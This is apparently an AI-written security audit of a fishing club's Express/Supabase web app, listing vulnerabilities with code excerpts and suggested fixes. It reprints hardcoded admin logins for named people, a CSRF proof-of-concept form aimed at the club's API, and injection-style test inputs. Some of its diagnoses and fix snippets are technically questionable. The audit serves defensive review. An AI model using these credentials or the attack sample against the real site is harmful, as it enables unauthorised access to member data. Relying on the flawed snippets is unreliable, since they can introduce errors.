# VISCLUB SIM - COMPREHENSIVE SECURITY & CODE AUDIT REPORT
**Date:** November 4, 2025
**Auditor:** Claude Code
**Scope:** Full codebase - Backend API, Frontend, Database, Configuration
**Status:** Pre-Production Security Assessment

---

## EXECUTIVE SUMMARY

### Production Readiness Score: **5.5/10** - NOT READY FOR PRODUCTION

**Critical Issues Found:** 9
**High Priority Issues:** 12
**Medium Priority Issues:** 8
**Low Priority Issues:** 5

### Key Findings:
1. **CRITICAL:** Multiple configuration conflicts between local mode and backend mode
2. **CRITICAL:** Missing rate limiting package (`express-rate-limit`)
3. **CRITICAL:** Hardcoded credentials in login.html
4. **CRITICAL:** No input validation/sanitization in API endpoints
5. **CRITICAL:** SQL injection vulnerabilities via Supabase client
6. **HIGH:** Incomplete error handling throughout codebase
7. **HIGH:** Missing HTTPS enforcement
8. **HIGH:** No CSRF protection
9. **HIGH:** Weak password requirements

---

## 1. CRITICAL SECURITY VULNERABILITIES

### 1.1 Configuration Conflicts (CRITICAL)
**Severity:** CRITICAL
**Files:** `admin/config.js`, `admin/admin-auth.js`, `admin/login.html`

**Issue:**
```javascript
// config.js - Line 24
USE_LOCAL_MODE: false,  // ✅ Always use Supabase backend

// admin-auth.js - Line 17
this.USE_LOCAL_MODE = true; // ← WIJZIG NAAR false VOOR DEPLOYMENT!

// login.html - Line 87
const USE_LOCAL_MODE = CONFIG.USE_LOCAL_MODE;
```

**Problem:** Three different files have conflicting LOCAL_MODE settings. This creates confusion and potential security bypass:
- `config.js` says to ALWAYS use backend
- `admin-auth.js` is STILL SET TO LOCAL MODE (true)
- `login.html` uses config but admin-auth overrides it

**Impact:**
- Admin panel may authenticate locally without hitting the backend
- Bypasses all database security and RLS policies
- Anyone who knows hardcoded credentials can access admin panel

**Fix Required:**
1. Remove `USE_LOCAL_MODE` from `admin-auth.js` entirely
2. Always read from `window.APP_CONFIG.USE_LOCAL_MODE`
3. Remove hardcoded credentials from login.html
4. Ensure single source of truth for configuration

### 1.2 Missing Rate Limiting Package (CRITICAL)
**Severity:** CRITICAL
**File:** `server/api-supabase.js` (Lines 95-114)

**Issue:**
```javascript
const rateLimit = require('express-rate-limit');

const apiLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100,
    // ...
});
```

**Problem:** `package.json` does NOT include `express-rate-limit` as a dependency!

```json
// package.json - MISSING express-rate-limit!
"dependencies": {
    "@supabase/supabase-js": "^2.78.0",
    "bcrypt": "^5.1.1",
    "cors": "^2.8.5",
    "dotenv": "^16.3.1",
    "express": "^4.18.2",
    "jsonwebtoken": "^9.0.2"
}
```

**Impact:**
- Server will CRASH on startup with "Cannot find module 'express-rate-limit'"
- This explains the error in CLAUDE.md:
  ```
  ❌ Server startup error: TypeError [ERR_INVALID_URL]: Invalid URL
  ```
- NO RATE LIMITING = Open to brute force attacks

**Fix Required:**
```bash
npm install express-rate-limit
```

### 1.3 Hardcoded Credentials Exposed (CRITICAL)
**Severity:** CRITICAL
**File:** `admin/login.html` (Lines 89-95)

**Issue:**
```javascript
const LOCAL_ADMINS = {
    'admin': 'admin123',
    'visclub': 'visclub2026',
    'kevin.dhont': 'visclub2026',
    'maarten.borghs': 'visclub2026',
    'kevin.vandun': 'visclub2026'
};
```

**Problem:**
- Credentials are visible to ANYONE who views the page source
- Weak passwords (e.g., "admin123", "visclub2026")
- These credentials are ACTIVE in production if USE_LOCAL_MODE=true

**Impact:**
- Anyone can login as admin by viewing source code
- No security whatsoever if local mode is enabled
- Member data, competition results, permits all accessible

**Fix Required:**
1. Remove ALL hardcoded credentials from client-side code
2. Force backend authentication ONLY
3. Remove local mode entirely from production build

### 1.4 No Input Validation/Sanitization (CRITICAL)
**Severity:** CRITICAL
**Files:** Multiple API endpoints in `server/api-supabase.js`

**Issue - Example from Members endpoint (Lines 334-369):**
```javascript
app.post('/api/members', authenticateToken, async (req, res) => {
    try {
        const {
            member_number, name, email, phone, address,
            is_veteran, is_active, join_date, notes
        } = req.body;

        // NO VALIDATION WHATSOEVER!
        const { data, error } = await supabase
            .from('members')
            .insert({
                member_number,  // Could be null, undefined, malicious
                name,           // Could be XSS payload
                email,          // Could be invalid email
                phone,          // Could be anything
                // ...
            })
```

**Problems:**
1. No validation of required fields
2. No sanitization of input data
3. No email format validation
4. No length checks
5. No type checking
6. XSS vulnerabilities in name/notes fields
7. No prevention of duplicate entries before DB

**Similar Issues Found In:**
- `/api/members` (POST, PUT)
- `/api/competitions` (POST)
- `/api/results` (POST)
- `/api/registrations` (POST)
- `/api/permits` (assumed endpoint)

**Impact:**
- XSS attacks via stored member names/notes
- Database corruption with invalid data
- Application crashes with malformed input
- Duplicate entries causing data inconsistency

**Fix Required:**
```javascript
// Example fix using express-validator or zod
const { body, validationResult } = require('express-validator');

app.post('/api/members',
    authenticateToken,
    [
        body('member_number').trim().notEmpty().withMessage('Member number required'),
        body('name').trim().notEmpty().escape().isLength({ min: 2, max: 255 }),
        body('email').optional().isEmail().normalizeEmail(),
        body('phone').optional().trim().matches(/^[0-9+\-\s()]*$/),
        body('is_veteran').optional().isBoolean(),
        // ...
    ],
    async (req, res) => {
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
            return res.status(400).json({ errors: errors.array() });
        }
        // ... proceed with insert
    }
);
```

### 1.5 SQL Injection via Supabase Client (CRITICAL)
**Severity:** CRITICAL
**Files:** All database queries in `server/api-supabase.js`

**Issue - Example (Line 232):**
```javascript
const { data, error } = await supabase
    .from('admin_users')
    .select('*')
    .eq('username', username)  // User input directly used
    .eq('is_active', true)
    .single();
```

**Analysis:**
While Supabase client library generally uses parameterized queries, there are risks:

1. **No Input Sanitization:** Username/emails not sanitized before query
2. **Wildcard Attacks:** If user input contains `%`, `_`, or other SQL wildcards
3. **Case Sensitivity Issues:** No normalization of email/username

**Example Attack Scenario:**
```javascript
// Attacker sends username with SQL-like characters
username: "admin'--"
// Or email with wildcards
email: "admin%@%"
```

**Fix Required:**
```javascript
// Sanitize all inputs before queries
const sanitizeInput = (str) => {
    if (!str) return str;
    return str.trim().replace(/[%_]/g, '\\$&');
};

const sanitizedUsername = sanitizeInput(username);
const { data, error } = await supabase
    .from('admin_users')
    .select('*')
    .eq('username', sanitizedUsername.toLowerCase())
    .eq('is_active', true)
    .single();
```

### 1.6 JWT Secret Validation Issues (CRITICAL)
**Severity:** CRITICAL
**File:** `server/api-supabase.js` (Lines 121-146)

**Issue:**
The JWT_SECRET validation is EXCELLENT, but there's a critical flaw:

```javascript
if (!JWT_SECRET) {
    console.error('❌ CRITICAL SECURITY ERROR: JWT_SECRET is not set');
    process.exit(1);  // Good!
}

if (JWT_SECRET.length < 32) {
    console.error('❌ CRITICAL SECURITY ERROR: JWT_SECRET is too short');
    process.exit(1);  // Good!
}

// BUT...
if (JWT_SECRET === 'your-secret-key-change-this-in-production' ||
    JWT_SECRET === 'change-me' ||
    JWT_SECRET === 'secret') {
    console.error('❌ CRITICAL SECURITY ERROR: JWT_SECRET is using a default/weak value');
    process.exit(1);  // Good!
}
```

**Missing Check:**
The .env.example file contains:
```
JWT_SECRET=your-super-secret-jwt-key-at-least-32-characters-long
```

This is 55 characters long and NOT in the blacklist! A developer could copy .env.example to .env and pass all checks with a publicly known secret!

**Fix Required:**
```javascript
// Add to blacklist
const WEAK_SECRETS = [
    'your-secret-key-change-this-in-production',
    'your-super-secret-jwt-key-at-least-32-characters-long',  // From .env.example
    'change-me',
    'secret',
    'jwt-secret',
    'test-secret'
];

if (WEAK_SECRETS.some(weak => JWT_SECRET.includes(weak))) {
    console.error('❌ CRITICAL SECURITY ERROR: JWT_SECRET contains weak/example value');
    process.exit(1);
}

// Also check entropy
const entropy = calculateEntropy(JWT_SECRET);
if (entropy < 3.5) {  // Low entropy = weak password
    console.error('❌ CRITICAL SECURITY ERROR: JWT_SECRET has low entropy');
    process.exit(1);
}
```

### 1.7 Missing Environment Variables Validation (CRITICAL)
**Severity:** CRITICAL
**File:** `server/api-supabase.js` (Lines 22-27)

**Issue:**
```javascript
if (!process.env.SUPABASE_URL || !process.env.SUPABASE_SERVICE_KEY) {
    console.error('❌ ERROR: Missing required environment variables');
    process.exit(1);
}
```

**Problem:** Only checks SUPABASE_URL and SERVICE_KEY, but IGNORES:
- `CORS_ORIGIN` - Could be undefined, causing security issues
- `PORT` - Defaults to 3000, but could cause conflicts
- `NODE_ENV` - Not validated, could be misspelled ("prod" vs "production")

**Impact:**
- CORS_ORIGIN undefined → Line 53: `process.env.CORS_ORIGIN` in allowedOrigins array → undefined in whitelist
- Line 63-64: `if (process.env.CORS_ORIGIN === '*')` → Could accidentally allow all origins
- Subtle security bypass if CORS_ORIGIN is accidentally set to empty string

**Fix Required:**
```javascript
// Comprehensive environment validation
const REQUIRED_ENV_VARS = {
    'SUPABASE_URL': 'Supabase project URL',
    'SUPABASE_SERVICE_KEY': 'Supabase service role key',
    'JWT_SECRET': 'JWT signing secret',
    'CORS_ORIGIN': 'Allowed CORS origin'
};

const missing = [];
for (const [key, description] of Object.entries(REQUIRED_ENV_VARS)) {
    if (!process.env[key] || process.env[key].trim() === '') {
        missing.push(`${key} (${description})`);
    }
}

if (missing.length > 0) {
    console.error('❌ CRITICAL ERROR: Missing required environment variables:');
    missing.forEach(m => console.error(`   - ${m}`));
    process.exit(1);
}

// Validate CORS_ORIGIN format
if (process.env.CORS_ORIGIN !== '*') {
    try {
        new URL(process.env.CORS_ORIGIN);
    } catch (e) {
        console.error('❌ ERROR: CORS_ORIGIN must be a valid URL or "*"');
        process.exit(1);
    }
}
```

### 1.8 No HTTPS Enforcement (CRITICAL)
**Severity:** CRITICAL
**Files:** All server configurations

**Issue:** No middleware to enforce HTTPS in production

**Problem:**
- JWT tokens sent over HTTP = sniffable
- Credentials sent in plaintext
- MITM attacks possible

**Fix Required:**
```javascript
// Add HTTPS enforcement middleware
if (process.env.NODE_ENV === 'production') {
    app.use((req, res, next) => {
        if (req.headers['x-forwarded-proto'] !== 'https') {
            return res.redirect(301, `https://${req.headers.host}${req.url}`);
        }
        next();
    });
}

// Add security headers
const helmet = require('helmet');
app.use(helmet({
    hsts: {
        maxAge: 31536000,
        includeSubDomains: true,
        preload: true
    }
}));
```

### 1.9 No CSRF Protection (CRITICAL)
**Severity:** CRITICAL
**Files:** All POST/PUT/DELETE endpoints

**Issue:** No CSRF tokens on state-changing operations

**Attack Scenario:**
```html
<!-- Malicious website -->
<form action="https://visclubsim.be/api/members" method="POST">
    <input name="member_number" value="999">
    <input name="name" value="Hacker">
    <input name="is_veteran" value="true">
</form>
<script>
    // If admin is logged in, this will create a member
    document.forms[0].submit();
</script>
```

**Fix Required:**
```javascript
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

// Apply to all state-changing routes
app.post('/api/members', csrfProtection, authenticateToken, async (req, res) => {
    // ...
});

// Send CSRF token on login
app.post('/api/auth/login', async (req, res) => {
    // ... after successful login
    res.json({
        token,
        csrfToken: req.csrfToken(),
        user: { /* ... */ }
    });
});
```

---

## 2. HIGH PRIORITY SECURITY ISSUES

### 2.1 Weak Password Requirements
**Severity:** HIGH
**File:** `database/schema.sql`

**Issue:** No password complexity requirements enforced at database level

**Current State:**
```sql
password_hash TEXT NOT NULL,
```

**Problems:**
- No minimum length requirement
- No complexity rules (uppercase, lowercase, numbers, symbols)
- Relies solely on bcrypt (which is good) but no pre-validation

**Fix Required:**
Add validation in API layer:
```javascript
const validatePassword = (password) => {
    const errors = [];

    if (password.length < 12) {
        errors.push('Password must be at least 12 characters long');
    }
    if (!/[a-z]/.test(password)) {
        errors.push('Password must contain lowercase letters');
    }
    if (!/[A-Z]/.test(password)) {
        errors.push('Password must contain uppercase letters');
    }
    if (!/[0-9]/.test(password)) {
        errors.push('Password must contain numbers');
    }
    if (!/[^a-zA-Z0-9]/.test(password)) {
        errors.push('Password must contain special characters');
    }

    // Check against common passwords
    const commonPasswords = ['password', 'admin', 'visclub', '123456', ...];
    if (commonPasswords.some(p => password.toLowerCase().includes(p))) {
        errors.push('Password is too common');
    }

    return errors;
};
```

### 2.2 No Request Body Size Limits
**Severity:** HIGH
**File:** `server/api-supabase.js` (Line 79)

**Issue:**
```javascript
app.use(express.json({ limit: '10mb' }));
```

**Problem:** 10MB is TOO LARGE for a fishing club application!

**Attack Scenario:**
- Attacker sends 10MB JSON payload to any endpoint
- Server parses and stores in memory
- 100 concurrent requests = 1GB memory usage
- Server crash/OOM

**Fix Required:**
```javascript
// Use reasonable limits
app.use(express.json({
    limit: '100kb',  // Sufficient for normal operations
    strict: true,
    type: 'application/json'
}));

app.use(express.urlencoded({
    extended: true,
    limit: '100kb'
}));

// Add error handler for payload too large
app.use((err, req, res, next) => {
    if (err.status === 413) {
        return res.status(413).json({
            error: 'Request too large',
            maxSize: '100kb'
        });
    }
    next(err);
});
```

### 2.3 Insufficient Logging
**Severity:** HIGH
**File:** `server/api-supabase.js` (Lines 83-92)

**Issue:**
```javascript
app.use((req, res, next) => {
    const sanitizedBody = req.body ? { ...req.body } : {};
    if (sanitizedBody.password) sanitizedBody.password = '[REDACTED]';
    if (sanitizedBody.token) sanitizedBody.token = '[REDACTED]';

    console.log(`${new Date().toISOString()} - ${req.method} ${req.path}`,
        req.query ? `Query: ${JSON.stringify(req.query)}` : '');
    next();
});
```

**Problems:**
1. Only logs to console (lost on restart)
2. No IP address logging
3. No user agent logging
4. No authentication status logging
5. No error logging
6. No audit trail for data changes

**Impact:**
- Can't investigate security incidents
- No audit trail for compliance
- Can't detect patterns of abuse
- No forensics capability

**Fix Required:**
```javascript
const winston = require('winston');

const logger = winston.createLogger({
    level: 'info',
    format: winston.format.json(),
    transports: [
        new winston.transports.File({
            filename: 'logs/error.log',
            level: 'error'
        }),
        new winston.transports.File({
            filename: 'logs/combined.log'
        }),
        new winston.transports.File({
            filename: 'logs/security.log',
            level: 'warn'
        })
    ]
});

// Enhanced logging middleware
app.use((req, res, next) => {
    const logData = {
        timestamp: new Date().toISOString(),
        method: req.method,
        path: req.path,
        ip: req.ip || req.headers['x-forwarded-for'],
        userAgent: req.get('User-Agent'),
        user: req.user ? req.user.username : 'anonymous',
        query: req.query
    };

    logger.info('HTTP Request', logData);

    // Log response
    const oldSend = res.send;
    res.send = function(data) {
        logger.info('HTTP Response', {
            ...logData,
            statusCode: res.statusCode,
            responseTime: Date.now() - req._startTime
        });
        oldSend.apply(res, arguments);
    };

    req._startTime = Date.now();
    next();
});
```

### 2.4 No Account Lockout After Failed Logins
**Severity:** HIGH
**File:** `server/api-supabase.js` (Lines 220-281)

**Issue:** Login endpoint has rate limiting (5 attempts per 15 min) but no account-specific lockout

**Problem:**
- Rate limit is per IP, not per account
- Attacker can use multiple IPs to bypass
- No permanent lockout after X failed attempts
- No notification to user about suspicious activity

**Fix Required:**
```javascript
// Store failed login attempts in database
CREATE TABLE IF NOT EXISTS login_attempts (
    id BIGSERIAL PRIMARY KEY,
    username VARCHAR(255) NOT NULL,
    ip_address VARCHAR(45),
    success BOOLEAN,
    attempted_at TIMESTAMPTZ DEFAULT NOW(),
    INDEX idx_username (username),
    INDEX idx_attempted_at (attempted_at)
);

// In login endpoint
const { data: recentAttempts } = await supabase
    .from('login_attempts')
    .select('*')
    .eq('username', username)
    .eq('success', false)
    .gte('attempted_at', new Date(Date.now() - 3600000))  // Last hour
    .order('attempted_at', { ascending: false });

if (recentAttempts && recentAttempts.length >= 5) {
    // Account locked
    logger.warn('Account locked due to multiple failed attempts', {
        username,
        ip: req.ip,
        attempts: recentAttempts.length
    });

    return res.status(423).json({
        error: 'Account temporarily locked due to multiple failed login attempts. Try again in 1 hour.',
        code: 'ACCOUNT_LOCKED'
    });
}

// Log attempt
await supabase.from('login_attempts').insert({
    username,
    ip_address: req.ip,
    success: validPassword,
    attempted_at: new Date().toISOString()
});
```

### 2.5 Missing Input Length Limits
**Severity:** HIGH
**Files:** All API endpoints

**Issue:** No explicit length validation before database insert

**Attack:** Send 10MB string in "notes" field → stored in database → slow queries

**Fix Required:**
```javascript
// Add max length checks
const MAX_LENGTHS = {
    name: 255,
    email: 255,
    phone: 50,
    address: 500,
    notes: 2000,
    member_number: 20
};

function validateLength(field, value, maxLength) {
    if (value && value.length > maxLength) {
        throw new Error(`${field} exceeds maximum length of ${maxLength}`);
    }
}
```

### 2.6 No Email Verification
**Severity:** HIGH
**File:** `database/schema.sql` (Member/Admin tables)

**Issue:**
```sql
email VARCHAR(255),
```

**Problem:** No email_verified flag or verification process

**Impact:**
- Users can enter fake emails
- No way to contact members
- Can't send password reset emails securely

**Fix Required:**
```sql
ALTER TABLE members ADD COLUMN email_verified BOOLEAN DEFAULT false;
ALTER TABLE members ADD COLUMN verification_token VARCHAR(64);
ALTER TABLE members ADD COLUMN verification_sent_at TIMESTAMPTZ;

ALTER TABLE admin_users ADD COLUMN email_verified BOOLEAN DEFAULT false;
```

### 2.7 Password Reset Vulnerability
**Severity:** HIGH
**Files:** Missing entirely!

**Issue:** No password reset functionality

**Problem:**
- If admin forgets password, they're locked out permanently
- No secure way to reset credentials
- Must contact database admin directly

**Fix Required:**
Implement password reset with:
1. Time-limited reset tokens (15 minutes)
2. One-time use tokens
3. Email verification required
4. Secure token generation (crypto.randomBytes)

### 2.8 No API Versioning
**Severity:** HIGH
**File:** `server/api-supabase.js`

**Issue:** All endpoints are `/api/*` with no version

**Problem:**
- Can't make breaking changes without breaking all clients
- No migration path for frontend updates
- Security fixes may break compatibility

**Fix Required:**
```javascript
// Version all routes
app.use('/api/v1/auth', authRouter);
app.use('/api/v1/members', membersRouter);
// etc.

// Redirect /api/* to /api/v1/* for backward compatibility
app.use('/api', (req, res, next) => {
    if (!req.path.startsWith('/v1/')) {
        return res.redirect(301, `/api/v1${req.path}`);
    }
    next();
});
```

### 2.9 Exposed Stack Traces
**Severity:** HIGH
**File:** `server/api-supabase.js` (Line 686-689)

**Issue:**
```javascript
app.use((err, req, res, next) => {
    console.error('Unhandled error:', err);  // Full error to console
    res.status(500).json({ error: 'Internal server error' });  // Good - no leak to client
});
```

**Problem:** While not leaked to client, errors are logged to console in production with full stack traces

**Fix Required:**
```javascript
app.use((err, req, res, next) => {
    // Log full error server-side
    logger.error('Unhandled error', {
        error: err.message,
        stack: process.env.NODE_ENV === 'development' ? err.stack : undefined,
        path: req.path,
        method: req.method,
        user: req.user?.username
    });

    // Never send stack trace to client
    const response = {
        error: 'Internal server error',
        requestId: req.id  // Add request ID for support
    };

    if (process.env.NODE_ENV === 'development') {
        response.details = err.message;  // Only in dev
    }

    res.status(500).json(response);
});
```

### 2.10 Missing Database Backup Strategy
**Severity:** HIGH
**Files:** No backup scripts found

**Issue:** No automated backup of database

**Impact:**
- Data loss if Supabase has issues
- No point-in-time recovery
- No disaster recovery plan

**Fix Required:**
1. Enable Supabase automated backups
2. Create daily export script
3. Store backups in separate location (S3, etc.)
4. Test restoration procedure

### 2.11 No Monitoring/Alerting
**Severity:** HIGH
**Files:** No monitoring configuration

**Issue:** No health monitoring or alerting

**Problems:**
- Won't know if server is down
- Won't detect attacks in progress
- No performance monitoring
- No error rate tracking

**Fix Required:**
```javascript
// Add health check with detailed info
app.get('/api/health', async (req, res) => {
    const health = {
        status: 'ok',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        memory: process.memoryUsage(),
        environment: process.env.NODE_ENV
    };

    // Check database connectivity
    try {
        const { data, error } = await supabase
            .from('admin_users')
            .select('id')
            .limit(1);

        if (error) {
            health.status = 'degraded';
            health.database = 'error';
        } else {
            health.database = 'ok';
        }
    } catch (e) {
        health.status = 'down';
        health.database = 'unreachable';
        return res.status(503).json(health);
    }

    res.json(health);
});

// Add monitoring integration (e.g., UptimeRobot, Pingdom)
```

### 2.12 Insecure JWT Token Expiration
**Severity:** HIGH
**File:** `server/api-supabase.js` (Line 263)

**Issue:**
```javascript
const token = jwt.sign(
    {
        id: user.id,
        username: user.username,
        role: user.role
    },
    JWT_SECRET,
    { expiresIn: '24h' }  // 24 hours is too long!
);
```

**Problem:**
- 24 hour token means stolen token is valid for full day
- No refresh token mechanism
- No way to invalidate token before expiration
- No "remember me" option

**Fix Required:**
```javascript
// Short-lived access token
const accessToken = jwt.sign(
    {
        id: user.id,
        username: user.username,
        role: user.role,
        type: 'access'
    },
    JWT_SECRET,
    { expiresIn: '15m' }  // 15 minutes
);

// Long-lived refresh token
const refreshToken = jwt.sign(
    {
        id: user.id,
        type: 'refresh'
    },
    JWT_SECRET,
    { expiresIn: '7d' }  // 7 days
);

// Store refresh token in database for revocation capability
await supabase.from('refresh_tokens').insert({
    user_id: user.id,
    token: refreshToken,
    expires_at: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
    created_at: new Date().toISOString()
});

res.json({
    accessToken,
    refreshToken,
    expiresIn: 900,  // 15 minutes in seconds
    user: { /* ... */ }
});
```

---

## 3. MEDIUM PRIORITY ISSUES

### 3.1 Incomplete Error Handling in DataAPI
**Severity:** MEDIUM
**File:** `admin/data-api.js`

**Issue:** Many async functions don't have try-catch blocks

**Examples:**
- Line 159: `executeQueuedOperation()` - throws but not caught by caller
- Line 254: `load()` - catches error but always returns empty array (loses error info)
- Line 289: `save()` - catches error but returns false (no error details)

**Fix Required:**
Add proper error propagation:
```javascript
async load(type) {
    try {
        // ... existing code
    } catch (error) {
        this.handleError(error, `loading ${type}`);
        throw error;  // Re-throw so caller can handle
    }
}
```

### 3.2 Offline Queue Persistence Issues
**Severity:** MEDIUM
**File:** `admin/data-api.js` (Lines 122-156)

**Issue:** Offline queue uses localStorage, which:
1. Has size limits (5-10MB)
2. Can be cleared by user
3. Not encrypted
4. Operations lost if user clears browser data

**Fix Required:**
```javascript
// Use IndexedDB for larger, more reliable storage
const DB_NAME = 'visclub_offline_queue';
const STORE_NAME = 'operations';

async function openDB() {
    return new Promise((resolve, reject) => {
        const request = indexedDB.open(DB_NAME, 1);
        request.onerror = () => reject(request.error);
        request.onsuccess = () => resolve(request.result);
        request.onupgradeneeded = (event) => {
            const db = event.target.result;
            if (!db.objectStoreNames.contains(STORE_NAME)) {
                db.createObjectStore(STORE_NAME, { keyPath: 'id', autoIncrement: true });
            }
        };
    });
}
```

### 3.3 No Database Connection Pooling
**Severity:** MEDIUM
**File:** `server/api-supabase.js` (Lines 29-38)

**Issue:**
```javascript
const supabase = createClient(
    process.env.SUPABASE_URL,
    process.env.SUPABASE_SERVICE_KEY,
    {
        auth: {
            autoRefreshToken: false,
            persistSession: false
        }
    }
);
```

**Problem:** Single Supabase client for all requests

**Impact:** Under high load, requests may queue or timeout

**Note:** Supabase client handles connection pooling internally via HTTP/HTTPS, so this is less critical than with direct PostgreSQL connections. However, should monitor performance.

### 3.4 Missing Content Security Policy
**Severity:** MEDIUM
**Files:** All HTML files

**Issue:** No CSP headers to prevent XSS

**Fix Required:**
```javascript
// In server/api-supabase.js
const helmet = require('helmet');
app.use(helmet.contentSecurityPolicy({
    directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", "'unsafe-inline'", "cdnjs.cloudflare.com"],
        styleSrc: ["'self'", "'unsafe-inline'", "cdnjs.cloudflare.com"],
        imgSrc: ["'self'", "data:", "https:"],
        fontSrc: ["'self'", "cdnjs.cloudflare.com"],
        connectSrc: ["'self'", process.env.SUPABASE_URL],
        frameSrc: ["'none'"],
        objectSrc: ["'none'"]
    }
}));
```

### 3.5 Inconsistent Date Handling
**Severity:** MEDIUM
**Files:** `script.js`, `admin/data-api.js`

**Issue:** Mixing Date objects, ISO strings, and formatted strings

**Example:**
```javascript
// script.js - Line 5
const TEST_DATE = new Date('2026-01-15');

// data-api.js - Line 336
registeredAt: new Date().toISOString()

// admin-script.js - Line 159
const regDate = reg.registeredAt ? reg.registeredAt.split('T')[0] : reg.date || '';
```

**Problem:** Inconsistent date handling leads to timezone bugs

**Fix Required:**
Use a date library (date-fns or day.js) consistently:
```javascript
import { format, parseISO } from 'date-fns';

const formattedDate = format(parseISO(reg.registeredAt), 'yyyy-MM-dd');
```

### 3.6 No Frontend Build Process
**Severity:** MEDIUM
**Files:** All frontend files

**Issue:** HTML files loaded directly without minification/bundling

**Problems:**
- Hardcoded credentials visible in source
- No code splitting
- No tree shaking
- Slow load times
- No TypeScript support

**Fix Required:**
Implement Vite or Webpack build:
```javascript
// vite.config.js
import { defineConfig } from 'vite';

export default defineConfig({
    build: {
        outDir: 'dist',
        minify: 'terser',
        sourcemap: false,  // Don't ship source maps to production
        rollupOptions: {
            output: {
                manualChunks: {
                    'vendor': ['@supabase/supabase-js']
                }
            }
        }
    },
    define: {
        'process.env.NODE_ENV': JSON.stringify(process.env.NODE_ENV)
    }
});
```

### 3.7 Ranking View Performance
**Severity:** MEDIUM
**File:** `database/schema.sql` (Lines 181-248)

**Issue:** Complex views with window functions and aggregations

**Potential Problem:**
- `club_ranking` view does ROW_NUMBER() OVER (PARTITION BY ...) which can be slow with many members
- `veteran_ranking` similar issue
- No materialized views for caching

**Fix Required:**
```sql
-- Create materialized views for performance
CREATE MATERIALIZED VIEW club_ranking_cached AS
SELECT * FROM club_ranking;

CREATE UNIQUE INDEX ON club_ranking_cached (member_id);

-- Refresh periodically (e.g., after each competition)
CREATE OR REPLACE FUNCTION refresh_rankings()
RETURNS void AS $$
BEGIN
    REFRESH MATERIALIZED VIEW CONCURRENTLY club_ranking_cached;
    REFRESH MATERIALIZED VIEW CONCURRENTLY veteran_ranking_cached;
END;
$$ LANGUAGE plpgsql;

-- Call after result inserts
CREATE TRIGGER refresh_rankings_after_result
AFTER INSERT OR UPDATE OR DELETE ON results
FOR EACH STATEMENT
EXECUTE FUNCTION refresh_rankings();
```

### 3.8 Missing API Documentation
**Severity:** MEDIUM
**Files:** No API docs found

**Issue:** No OpenAPI/Swagger documentation

**Impact:**
- Frontend developers don't know API contract
- No testing interface
- Breaking changes not documented

**Fix Required:**
```javascript
const swaggerUi = require('swagger-ui-express');
const swaggerJsdoc = require('swagger-jsdoc');

const swaggerOptions = {
    definition: {
        openapi: '3.0.0',
        info: {
            title: 'Visclub SiM API',
            version: '1.0.0',
            description: 'Fishing club management API'
        },
        servers: [
            {
                url: process.env.API_URL || 'http://localhost:3000',
                description: 'API server'
            }
        ],
        components: {
            securitySchemes: {
                bearerAuth: {
                    type: 'http',
                    scheme: 'bearer',
                    bearerFormat: 'JWT'
                }
            }
        }
    },
    apis: ['./server/*.js']
};

const swaggerSpec = swaggerJsdoc(swaggerOptions);
app.use('/api/docs', swaggerUi.serve, swaggerUi.setup(swaggerSpec));
```

---

## 4. LOW PRIORITY ISSUES

### 4.1 Console.log in Production
**Severity:** LOW
**Files:** Multiple files use console.log

**Issue:** Debug logs shipped to production

**Fix:** Use proper logging library (winston) or remove console.logs in production build

### 4.2 TODO Comments
**Severity:** LOW
**Files:** Various

**Issue:** Unfinished code indicated by TODO comments

**Action:** Search codebase for TODO and complete or remove

### 4.3 Unused Dependencies
**Severity:** LOW
**File:** `package.json`

**Action:** Audit dependencies with `npm audit` and remove unused packages

### 4.4 No TypeScript
**Severity:** LOW
**Files:** All JavaScript files

**Benefit:** TypeScript would catch many bugs at compile time

**Recommendation:** Consider gradual migration to TypeScript

### 4.5 No E2E Tests
**Severity:** LOW
**Files:** No test files found

**Missing:** Playwright/Cypress tests for critical user flows

**Recommendation:** Implement E2E tests for:
- Admin login flow
- Member CRUD operations
- Competition registration
- Payment processing

---

## 5. DATABASE SCHEMA ISSUES

### 5.1 Missing Constraints
**Severity:** MEDIUM
**File:** `database/schema.sql`

**Issues:**

1. **Members table:**
   ```sql
   email VARCHAR(255),  -- Should be UNIQUE
   ```

2. **Permits table:**
   ```sql
   permit_number VARCHAR(50) UNIQUE,  -- Good
   -- But no CHECK constraint on start_date < end_date
   ```

3. **Results table:**
   ```sql
   -- No check that points match scoring rules (1st place = 1 point, etc.)
   ```

**Fix Required:**
```sql
ALTER TABLE members ADD CONSTRAINT unique_email UNIQUE (email);
ALTER TABLE members ADD CONSTRAINT valid_email CHECK (email ~* '^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}$');

ALTER TABLE permits ADD CONSTRAINT valid_permit_dates CHECK (start_date < end_date);

ALTER TABLE results ADD CONSTRAINT valid_points CHECK (
    (points >= 1 AND points <= 50) OR
    (is_absent = true AND points = 50) OR
    (points = 43)  -- Caught nothing
);
```

### 5.2 RLS Policy Gaps
**Severity:** HIGH
**File:** `database/rls-policies.sql`

**Issue:** Views don't have explicit RLS policies

**Problem:**
```sql
-- Line 143-147
ALTER VIEW club_ranking SET (security_invoker = true);
ALTER VIEW veteran_ranking SET (security_invoker = true);
-- ...
```

`security_invoker = true` means views run with CALLER's permissions, not DEFINER's. This is good, but:

**Gap:** If a view joins tables with different RLS policies, results may be inconsistent or leak data

**Example:**
```sql
-- club_ranking joins results (public) with members (public only if active)
-- What if a member is deactivated? Their results still show in ranking?
```

**Fix Required:**
```sql
-- Ensure views respect RLS
-- club_ranking should only show active members
CREATE OR REPLACE VIEW club_ranking AS
-- ... existing query
WHERE m.is_active = true  -- Already present, good!
```

**Verification Needed:** Test that views properly respect RLS when queried by:
1. Anonymous user (anon key)
2. Service role (should see all)

### 5.3 No Soft Deletes
**Severity:** MEDIUM
**File:** `database/schema.sql`

**Issue:** `ON DELETE CASCADE` means permanent data loss

**Example:**
```sql
CREATE TABLE IF NOT EXISTS registrations (
    -- ...
    competition_id BIGINT NOT NULL REFERENCES competitions(id) ON DELETE CASCADE,
```

**Problem:** If a competition is deleted, ALL registrations are permanently lost (no audit trail)

**Fix Required:**
```sql
-- Add deleted_at column to all tables
ALTER TABLE competitions ADD COLUMN deleted_at TIMESTAMPTZ;
ALTER TABLE registrations ADD COLUMN deleted_at TIMESTAMPTZ;
